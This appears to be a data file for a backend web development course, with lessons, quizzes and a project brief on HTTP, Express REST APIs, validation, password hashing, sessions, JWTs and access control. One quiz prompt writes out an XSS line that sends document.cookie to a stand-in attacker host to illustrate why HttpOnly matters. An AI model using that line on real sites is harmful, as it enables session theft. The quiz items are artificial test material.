exam.explain: Spread copies one level: `next` is a new object, but its `tags` is the very same array as `prev.tags`. Pushing into it mutates the shared array, so the 'previous' state changed too. Copy nested data as well: `{ ...prev, tags: [...prev.tags, "y"] }`.

lessons.title: HTTP in depth
lessons.objective: By the end you can read a raw HTTP exchange and choose the right method, status code and caching headers for an endpoint.
concept: HTTP is a protocol of **requests** and **responses**, carried over TCP (or QUIC for HTTP/3) and almost always wrapped in TLS. A request has a method, a path, headers and an optional body; a response has a status code, headers and an optional body. Run `curl -v https://api.github.com/users/octocat` and read every line: you will see `Host`, `User-Agent` and `Accept` going out, then a `200` status and headers like `content-type: application/json` and `cache-control` coming back. Reading this fluently is a core debugging skill.

Methods carry meaning. `GET` reads and must be **safe**, with no side effects. `PUT` replaces a resource and `DELETE` removes one; both are **idempotent**, meaning repeating the request leaves the server in the same state, so clients and proxies may safely retry them. `POST` creates resources or triggers actions and is not idempotent, which is why payment APIs accept an `Idempotency-Key` header. `PATCH` applies a partial update. Status codes group by first digit: 2xx success, 3xx redirection, 4xx client error, 5xx server error.

Pick precise codes. Use `201 Created` with a `Location` header after a POST, `204 No Content` after a DELETE, `400` for malformed input, `401` when the client is not authenticated, `403` when it is authenticated but not allowed, `404` when the resource is not found, `409` for a conflict such as a duplicate email, `422` for well-formed but invalid data, and `429` when rate-limited. Reserve `500` for bugs on your side; a client mistake should never produce a 5xx.

**Caching** saves round trips. `Cache-Control: max-age=3600` lets a cache reuse a response for an hour; `no-store` forbids storing it at all; `private` allows only the user's own browser to cache it, never a shared cache or CDN. With an `ETag`, the client later sends `If-None-Match` and the server replies `304 Not Modified`, with no body, if nothing changed. Fingerprinted static files like `app.3f9a1c.js` can be cached for a year with `immutable`.

questions.prompt: Which of these methods is NOT idempotent?
questions.explain: Sending the same POST twice usually creates two resources or two charges. Repeating a PUT or DELETE leaves the same end state, and GET has no side effects at all.

questions.prompt: A logged-in user sends `DELETE /api/projects/9` for a project that belongs to another account. They are authenticated but not permitted, and your API is fine with revealing that the project exists. Which status fits?
questions.explain: `403` means 'I know who you are, and you may not do this'. `401` means the request lacks valid authentication, which is not the case. `404` is the right choice when you want to hide the resource's existence, which this question rules out.

questions.prompt: What does this print?
questions.code:
const u = new URL("https://shop.example.com/search?q=red%20shoes&page=2");
console.log(u.pathname, u.searchParams.get("q"), Number(u.searchParams.get("page")) + 1);
questions.explain: `pathname` excludes the query string. `searchParams.get` returns the decoded value, so `%20` becomes a space. Query values are always strings, so `"2" + 1` would be "21"; converting with `Number` first gives 3.

questions.prompt: A per-user dashboard endpoint returns `Cache-Control: public, max-age=600` and sits behind a CDN. Some users report seeing other people's data. What is the cause and fix?
options: The ETag is wrong; regenerate it
public lets the shared CDN cache store one user's response and serve it to others; use private (or no-store) for per-user data
max-age is too short; raise it
The browser cache is corrupted; ask users to clear it
questions.explain: `public` allows any cache, including shared ones, to store and reuse the response for other requests to the same URL. Personalised responses need `private` or `no-store`. A longer `max-age` would make the leak last longer.

lessons.why: Every API you build or call speaks HTTP. Choosing the right method, status code and cache headers makes APIs predictable, fast and safe to retry.

terms.d: Has no side effects, like `GET`.
Repeating it has the same effect as doing it once, like `PUT` and `DELETE`.
201 created, 204 no content, 400 bad input, 401 not authenticated, 403 forbidden, 404 not found.
Tells caches whether and how long to reuse a response.

mistakes.right: `PUT` replaces a resource at a known URL and is idempotent; `POST` creates and isn't.

mistakes.wrong: 401 and 403 mean the same thing.

takeaways: Methods carry meaning: GET reads, POST creates, PUT/PATCH update, DELETE removes.
Pick precise status codes so clients can react correctly.

lessons.title: Building a REST API with Express
lessons.objective: By the end you can build a CRUD JSON API in Express with resource-oriented routes, middleware and correct status codes.
concept: REST models your API as **resources** identified by URLs and manipulated with HTTP methods: `GET /notes` lists, `POST /notes` creates, `GET /notes/:id` reads one, `PATCH /notes/:id` updates, `DELETE /notes/:id` deletes. Use plural nouns rather than verbs (`POST /notes`, not `/createNote`), nest at most one level (`/projects/7/tasks`), and use query strings for filtering, sorting and pagination: `GET /notes?done=false&limit=20&cursor=abc`. Version public APIs with a prefix such as `/v1`.

In Express, an app is a stack of **middleware**: functions `(req, res, next)` that run in the order you register them, each either responding or calling `next()`. `app.use(express.json())` parses JSON bodies into `req.body`; forget it and `req.body` is `undefined`. Route handlers read `req.params`, `req.query` and `req.body`, then respond with `res.status(201).json(note)`. Routes match in registration order, so define `/notes/stats` before `/notes/:id`, or the parameterised route captures `stats` as an id.

Structure even small APIs in layers: **routes** parse HTTP and choose status codes, a **service** module holds the business rules, and a **repository** talks to the database. Export `app` from `app.js` and call `app.listen` only in `server.js`; tests can then import the app without opening a port (module 5). FastAPI in Python follows the same ideas with type-hinted handlers and automatic OpenAPI docs; pick one stack for your project and go deep rather than wide.

questions.prompt: Which is the most RESTful way to create a note?
questions.explain: Creation is a POST to the collection, with the data in the body. A GET must not change state, verbs in URLs duplicate what the method already says, and `PUT /notes/new` treats 'new' as an id.

questions.prompt: An app registers `app.get("/users/:id", ...)` and then `app.get("/users/me", ...)`. What handles `GET /users/me`?
options: The /users/me handler, because it is more specific
questions.explain: Express tries routes in registration order and `:id` matches any segment, including `me`. Register the literal route first. Express does not rank routes by specificity.

questions.prompt: `POST /notes` works, but `GET /notes/1` always returns 404, even right after creating note 1. The handler does `notes.get(req.params.id)` on a Map whose keys were set with numeric ids. Why?
options: req.params.id is the string "1" and Map keys use strict equality, so "1" does not match 1
Route parameters are only available in POST
questions.explain: Path parameters are always strings. `Map` compares keys like `===` (SameValueZero), so the string never finds the number key. Convert with `Number(req.params.id)` (and validate it). `express.json()` affects only `req.body`.

questions.prompt: Arrange the lines into a handler that returns one note, or a 404 JSON error if it does not exist.
questions.explain: Look the note up, return early with 404 if it is missing, and otherwise send it. The `return` inside the `if` is what stops the handler from also reaching `res.json(note)`.

lessons.why: A REST API with clear routes and layers is the backbone of most web apps. Express shows the middleware pattern you'll see in nearly every web framework.

terms.d: A thing identified by a URL, like `/notes/42`.
`(req, res, next)` functions that run in order, each responding or passing on.
Parses the request and chooses the status code.
Business rules / database access, kept out of routes.

mistakes.wrong: Putting SQL and business rules directly in route handlers is fine.
mistakes.right: It makes them hard to test and change. Keep routes thin and push logic into a service.

mistakes.wrong: Middleware order doesn't matter.
mistakes.right: It runs in registration order; `express.json()` must come before routes that read `req.body`.

takeaways: Name routes after resources, not actions.
Middleware is a pipeline; order matters.
Routes → service → repository keeps each layer simple.

lessons.title: Validation and error handling
lessons.objective: By the end you can validate every request at the boundary, return consistent error responses, and make sure no error crashes the server or leaks internals.
concept: Treat every request as untrusted input. Validate **at the boundary**, before data reaches your business logic: types, required fields, lengths, ranges and formats. A schema library such as **Zod** (Node) or Pydantic (FastAPI) lets you declare the shape once and get a typed, parsed value back: `const body = NoteInput.parse(req.body)`. Reject or strip unknown fields, so a client cannot sneak in `{ "isAdmin": true }` that gets spread into a database row; that bug is called **mass assignment**.

Return errors in **one consistent shape** so clients can handle them generically, for example `{ "error": { "code": "validation_failed", "message": "...", "fields": { "text": ["Required"] } } }`. Use `400` or `422` for invalid input, `404` for missing resources and `409` for conflicts. Never send stack traces or raw database errors to clients, because they reveal file paths, library versions and table names. Log the details server-side with a request id and return a generic `500` message that includes that id.

In Express, **error-handling middleware** has four parameters, `(err, req, res, next)`, and is registered after the routes. A synchronous throw in a handler reaches it automatically. In Express 4, a rejected promise from an `async` handler does **not**: the request hangs and Node reports an unhandled rejection, so you must wrap handlers or call `next(err)`. Express 5 forwards rejected promises for you. Small error classes like `NotFoundError` with a `status` let services throw meaningful errors without knowing about HTTP details.

left.title: Leaky
points: 500 with a stack trace in the body
Exposes file paths, versions and SQL
Different shape on every endpoint
Clients must parse message strings

right.title: Consistent
points: Correct 4xx or 5xx status
{ error: { code, message, fields } }
Request id that links to the server log
Details logged, never sent

example.explain: The schema trims, length-checks and type-checks the body and refuses extra keys, so the service receives only clean data. Known errors become precise 4xx responses; anything unexpected is logged with its request id and returned as a generic 500 that leaks nothing.

lessons.tryit: Add Zod (or hand-written) validation to every route of your notes API, plus the error middleware. Write a list of 8 bad requests (missing `text`, 10,000-character `text`, `done: "yes"`, an extra `isAdmin` field, malformed JSON, a non-numeric id, an unknown id, and a route that deliberately throws) and check each returns the right status in the same error shape, with no stack trace in any response.

questions.prompt: How does Express recognise error-handling middleware?
options: It declares four parameters: (err, req, res, next)
questions.explain: Express checks the function's arity: four declared parameters marks it as an error handler. That is why you must keep `next` in the signature even if you never call it.

questions.prompt: What does this print?
questions.explain: The title is a string but empty after trimming, so it fails. `qty` is the string "2", and `Number.isInteger("2")` is false because it does not coerce. Form and query values arrive as strings, so a validator must parse them deliberately (e.g. `z.coerce.number()`) rather than hope.

questions.prompt: What is the security problem in this handler?
options: SQL injection through the insert helper
Because req.body is spread after ownerId, a client can send its own ownerId and create notes in another user's account (mass assignment)
questions.explain: Later keys win in an object spread, so a client-supplied `ownerId` overwrites the server's value. Validate the body into an explicit allow-listed shape and set server-controlled fields last, or separately.

questions.prompt: `POST /users` arrives with valid JSON, but the email is already registered. Which status is most appropriate?
questions.explain: The request is well-formed and valid on its own; it conflicts with the current state of the server. `500` would claim a server bug, and `404` makes no sense for a create.

lessons.why: Unvalidated input causes crashes, data corruption and security holes. Validating at the boundary and returning consistent errors makes an API robust and easy to use.

terms.d: Check types, required fields, lengths and formats before business logic runs.
A declarative description of valid input, as with Zod.
`(err, req, res, next)` registered after routes.
Copying all request fields into a record, letting clients set fields like `isAdmin`.

mistakes.wrong: Returning the raw exception message helps clients debug.
mistakes.right: It can leak internals such as SQL and file paths. Log details; return a generic message with a code.

mistakes.wrong: Validating the frontend form means the API is safe.
mistakes.right: Anyone can send requests directly. The API must validate every request.

takeaways: Parse every request with a schema and pick only the fields you allow.
Return errors in one consistent shape.
Catch async errors so they reach your error handler instead of crashing.

lessons.title: Authentication: sessions, JWTs, password hashing
lessons.objective: By the end you can store passwords safely and implement login with either server-side sessions or JWTs, explaining the trade-offs of each.
concept: Never store passwords, not even encrypted. Store a **slow, salted hash** made by a password-hashing function: **argon2id**, **scrypt** or **bcrypt**. A unique random **salt** per user means identical passwords produce different hashes and precomputed tables are useless; a deliberately slow, memory-hard function makes every guess expensive, so a leaked database cannot be brute-forced at billions of guesses per second as SHA-256 hashes can. Compare hashes in constant time, and say "invalid email or password" for both unknown emails and wrong passwords.

With **sessions**, login creates a random session id, stores `sessionId → userId, expiry` on the server (in the database or Redis) and sends the id in a cookie. Each request looks the id up, and logging out or banning a user takes effect instantly: delete the row. Set the cookie `HttpOnly` (page JavaScript cannot read it, which limits XSS damage), `Secure` (sent over HTTPS only) and `SameSite=Lax` (not sent on most cross-site requests, a defence against CSRF).

A **JWT** is a signed token, `header.payload.signature`, each part base64url-encoded. The server verifies the signature and trusts the claims inside, such as `sub` and `exp`, without a database lookup, which suits several services sharing one login. But the payload is only **encoded, not encrypted**, so never put secrets in it, and a stolen token stays valid until it expires, which makes revocation hard. For a single web app, a session cookie is usually simpler and safer; JWTs earn their place with mobile clients or multiple backends, kept short-lived with a refresh token.

left.title: Server-side session
points: Cookie holds a random id, no user data
Server looks the id up on each request
Revoke instantly by deleting the row
Needs a shared store when you run many servers

right.title: JWT
points: Token carries signed claims (sub, exp)
Server verifies the signature, no lookup
Hard to revoke before exp
Payload is readable by anyone holding it

example.explain: Each hash gets a fresh 16-byte salt stored alongside it, so verifying re-derives the key with the same salt and compares. `timingSafeEqual` takes the same time however many bytes match, so response timing reveals nothing. The async version keeps the event loop free while scrypt works.

lessons.tryit: Add `POST /auth/register`, `POST /auth/login` and `POST /auth/logout` to your API. Hash with argon2 (the `argon2` package) or the scrypt code above, store sessions in a table (or a Map for now), and set an `HttpOnly; Secure; SameSite=Lax` cookie. Then paste any JWT into https://jwt.io and confirm you can read its payload without knowing the secret. Write two sentences on which approach your project uses and why.

questions.prompt: Which is an appropriate way to store user passwords?
questions.explain: argon2id is a slow, memory-hard password hash and the salt defeats precomputed tables. SHA-256 is fast, which is exactly what an attacker wants; encryption is reversible by anyone who gets the key; Base64 is not protection at all.

questions.prompt: This token is from a request. What does the code print?
questions.explain: The middle segment is just base64url-encoded JSON, so anyone can decode it without the secret. The signature only proves the server issued it. Never put secrets or personal data you would not show the user into a JWT payload.

questions.prompt: Your app issues JWTs that expire after 30 days and keeps no server-side session state. A user's laptop is stolen and they want to be logged out everywhere right now. What is the core problem?
options: JWTs cannot be stored in localStorage
A validly signed JWT is accepted until it expires unless you add server-side state such as a denylist or a per-user token version, so it cannot be revoked instantly
The token is invalidated automatically when the device changes
JWTs are encrypted, so the thief cannot use it
questions.explain: Stateless verification is the selling point of JWTs and also the problem: the server has nothing to delete. Short lifetimes plus refresh tokens stored server-side, or a token-version check, restore revocation. Tokens are signed, not encrypted, and are not bound to a device.

questions.prompt: An XSS bug lets an attacker run `fetch('https://evil.example/?c=' + document.cookie)` in your users' browsers. Which cookie attribute keeps the session id out of `document.cookie`?
questions.explain: `HttpOnly` cookies are sent with requests but are invisible to page JavaScript. `Secure` only restricts them to HTTPS, `SameSite` controls cross-site sending, and `Max-Age` sets the lifetime.

video.title: Session vs Token Authentication

lessons.why: Authentication bugs expose every user at once. Hashing passwords correctly and understanding sessions versus tokens is basic professional practice.

terms.d: A slow, salted one-way function like argon2id, scrypt or bcrypt.
A unique random value per password so identical passwords hash differently.
A random id in a cookie mapped to the user on the server.
A signed token whose claims the server trusts after checking the signature.

mistakes.wrong: Encrypting passwords is safe storage.
mistakes.right: Encryption can be reversed with the key. Store a slow, salted hash.

mistakes.wrong: A JWT's contents are secret.
mistakes.right: They're base64url-encoded, not encrypted; anyone can read them. Don't put secrets inside.

takeaways: Use argon2id, scrypt or bcrypt, never a fast hash like SHA-256 alone.
Sessions are easy to revoke; JWTs avoid a lookup but are hard to revoke early.
Cookies should be `HttpOnly`, `Secure` and `SameSite`.

lessons.title: Authorization
lessons.objective: By the end you can enforce who may do what on every endpoint, prevent insecure direct object references, and specify access rules as testable cases.
concept: **Authentication** answers *who are you?*; **authorization** answers *may you do this?* Broken access control tops the OWASP Top 10 (2021) because it is easy to forget: an endpoint checks that you are logged in, then happily returns `/api/invoices/1043` whether or not invoice 1043 is yours. That bug is an **IDOR**, an insecure direct object reference. Changing the number in a URL is the first thing an attacker, or a merely curious user, will try.

Enforce authorization **on the server, on every request**, close to the data. A robust pattern is to scope queries by owner: `SELECT * FROM invoices WHERE id = $1 AND user_id = $2`. If nothing comes back, return `404`, which also avoids revealing that the record exists. Hiding a button in the UI is not authorization, because anyone can call the API with curl. **Deny by default**: a new route should be locked until someone deliberately opens it, not open until someone remembers to lock it.

For roles, start with simple **RBAC** (role-based access control): each user has a role such as `member` or `admin`, and a single `can(user, action, resource)` function encodes all the rules in one testable place instead of scattering `if` statements through handlers. Ownership rules, such as "members edit their own notes", combine the role with the resource. Test the negative cases above all: user B reading user A's data must fail, and a member calling an admin route must get `403`.

example.explain: Users who may not even see the note get a 404, so ids cannot be probed. Users who can see it but not edit it (the admin here) get a 403. All rules live in `can`, which is a pure function and trivial to unit-test.

lessons.tryit: Create two users in your API and log in as each from two terminals (curl with separate `-c`/`-b` cookie jars). Try every route using the other user's ids and fix every leak by scoping queries or calling `can()`. Then write an access table like the one above for your project; each 'no' cell becomes a test case you will implement in module 5.

questions.prompt: What is the difference between authentication and authorization?
options: Authentication establishes who the user is; authorization decides what that user may do
Authentication is for APIs, authorization is for web pages
questions.explain: You first establish identity (login, session, token), then check permissions for each action. A request can be perfectly authenticated and still unauthorized.

questions.prompt: What does this print?
questions.explain: The admin may read any note. Updating requires ownership, and the note belongs to user 2. `note:destroy` has no rule, so deny-by-default returns false; a typo in an action name fails closed instead of open.

questions.prompt: What is the most serious problem with this endpoint?
options: Any logged-in user can read any invoice by changing the id (IDOR); scope the query with AND user_id = $2 using req.user.id
It is missing a Cache-Control header
questions.explain: `requireAuth` only proves the caller is logged in. Nothing ties the invoice to them. The `$1` placeholder is parameterised, so injection is not the issue.

questions.prompt: The link to the admin page is hidden in the UI for non-admin users. Is the admin API protected?
options: Yes, users cannot click what they cannot see
No; every admin endpoint must check the role on the server
Yes, if the JavaScript bundle is minified
questions.explain: Anyone can read your frontend code or call the API directly with curl. UI hiding is a convenience; the server check is the security. CORS restricts which websites' scripts can read responses, not who can send requests.

video.title: OWASP Top 10 - Broken Access Control

lessons.why: Broken access control is the most common serious web vulnerability. Checking permissions on the server, on every request, protects every user's data.

terms.d: Who you are vs what you may do.
Insecure direct object reference: changing an id in a request reaches someone else's data.
Everything is forbidden unless a rule allows it.
Role-based access control: permissions attached to roles like member or admin.

mistakes.wrong: Hiding a button in the UI stops users from doing the action.

project.title: REST API with auth
project.brief: Build a JSON REST API in Express (or FastAPI) for a small multi-user app such as notes, bookmarks or a reading list. It must use correct HTTP semantics, validate every input, authenticate users with hashed passwords, and enforce per-user authorization, which together are the core of almost every backend job.
milestones: Resource routes for one main entity with full CRUD, correct status codes (201 with Location, 204, 404, 409, 422) and limit/offset or cursor pagination on the list endpoint.
Zod or Pydantic validation on every body, param and query, and one error middleware returning a single consistent error JSON shape.
Register, login and logout with argon2 or scrypt hashing and HttpOnly, Secure, SameSite=Lax session cookies (or short-lived JWTs, justified in the README).
Every query scoped to the current user; a second user cannot read, edit or delete the first user's data, verified with curl.
A .http file or curl script that exercises every endpoint, including at least 5 failure cases, and a README documenting each route.
